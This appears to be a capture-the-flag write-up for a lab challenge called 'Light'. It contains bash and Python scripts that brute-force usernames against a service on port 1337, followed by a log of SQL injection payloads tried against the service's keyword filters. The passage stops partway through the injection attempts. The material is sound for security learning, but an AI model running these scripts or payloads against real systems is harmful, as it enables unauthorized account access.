# Light

_**Bash script to brute force the password:**_

```bash
#!/usr/bin/bash

filename="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"

while IFS="" read -r line; do
	# eg. echo smokey | nc <target> 1337
	res=$(echo "$line" | nc -w 1 <target> 1337)

	if [[ "$res" == *"not found"* ]]; then
		# if the substring "not found" is present, means user not found
		...
	else
		# print success message and exit
		...
	fi;

done < "$filename"


```

_**Python script:**_

```python
#!/usr/bin/python3

import socket

HOST='10.10.34.209'
PORT=1337
#filename='/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt'
#filename='test.txt'
#filename='/usr/share/wordlists/SecLists/Usernames/Names/names.txt'
#filename='/usr/share/wordlists/SecLists/Usernames/Names/femalenames-usa-top1000.txt'
#filename='Security-Research/tools/aws-pentest-tools/iam_user_enum/default-word-list.txt'
filename='wordlist/usernames.txt'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST,PORT))
    s.recv(1024) # flush 1
    s.recv(1024) # flush 2


    f = open(filename, 'r')

    for username in f:
        if len(username) <= 10:
            continue

        username = username.lower()

        print(f'[!] Trying {username.replace('\n', '')}', end=' ')
        
        s.send(bytes(username, 'utf-8'))
        data = s.recv(1024)
        str_data = str(data, 'utf-8')

        if 'not found' in str_data:
            print('failed')
            s.recv(50)

        else:
            print(str_data)
            break

    f.close()

```

_**Word-lists to try out**_:

1. /`usr/share/wordlists/seclists/Usernames/Names/names.txt`
2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`

I found the username: alice. However this wasn't the admin username. Probably a rookie mistake on my part for not realising sooner that an SQL injection is likely to be more feasible.&#x20;

### SQL Injection

I noticed that the input form length is very long, and realized that it's highly unlikely that I would be able find the username with a simple brute-force. The following shows a bunch of input (first line) and output from the application (second line)

**Possible SQL statements on the server side:**

```sql
SELECT * FROM users WHERE name='smokey';
```

**Attempts with common SQL injection inputs:**

1. **Force the statement to resolve to true**

Potentially tricking the database to return all the users

```sql
' OR 1=1 --
```

```sql
SELECT * FROM users WHERE name='' OR 1=1--';
```

Reponse: _For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)_

This tells us that comment values are banned



**Another attempt:**

```sql
' OR ''='
```

```sql
SELECT * FROM users WHERE name='' OR ''='';
```

This seems to return a password value (that is returned from the _alice_ username).&#x20;



2. UNION and SELECT statement

The UNION and SELECT keywords (along with their lower capital variations) are all banned too

```sql
UNION
SELECT
union
select
```

Reponse: _Ahh there is a word in there I don't like :(_

<pre class="language-sql"><code class="lang-sql">-- 1)
--INPUT: ' OR 1=1 
-- Error: unrecognized token:  "' LIMIT 30" 

--3) 
--INPUT: ' OR 1=1;
--Pause with no response

--2) 
--INPUT: 'UNION 
<strong>--Ahh there is a word in there I don't like :(
</strong>
--3)
--INPUT: 'SELECT
--Ahh there is a word in there I don't like :(

--4)
<strong>--INPUT: '--
</strong>--For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)

--5) 
--INPUT: '' LIMIT 30 OR '1=1;
--Error: near "LIMIT": syntax error

</code></pre>



```sql
SELECT * FROM users WHERE name=''--';
```
